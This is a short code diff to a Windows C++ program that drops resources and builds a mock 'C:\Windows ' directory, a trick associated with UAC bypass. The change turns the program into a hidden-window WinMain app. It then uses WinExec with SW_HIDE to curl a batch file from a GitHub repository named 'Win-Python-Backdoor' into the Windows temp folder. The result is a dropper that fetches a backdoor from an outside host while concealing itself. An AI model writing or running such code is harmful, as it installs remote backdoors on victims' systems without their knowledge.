@@ -13,9 +13,11 @@ void DropResource(const wchar_t* rsrcName, const wchar_t* filePath) {
 	CloseHandle(hDll);
 }
 
-int main()
+//int main()
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd)
 {
-	system("curl -L https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat -o c:\\windows\\temp\\win.bat");
+	WinExec("curl -L https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat -o c:\\windows\\temp\\win.bat", SW_HIDE);
+	//system("curl -L https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat -o c:\\windows\\temp\\win.bat");
 	_SHELLEXECUTEINFOW se = {};
 	//Create Mock SystemRoot Directory
 	CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
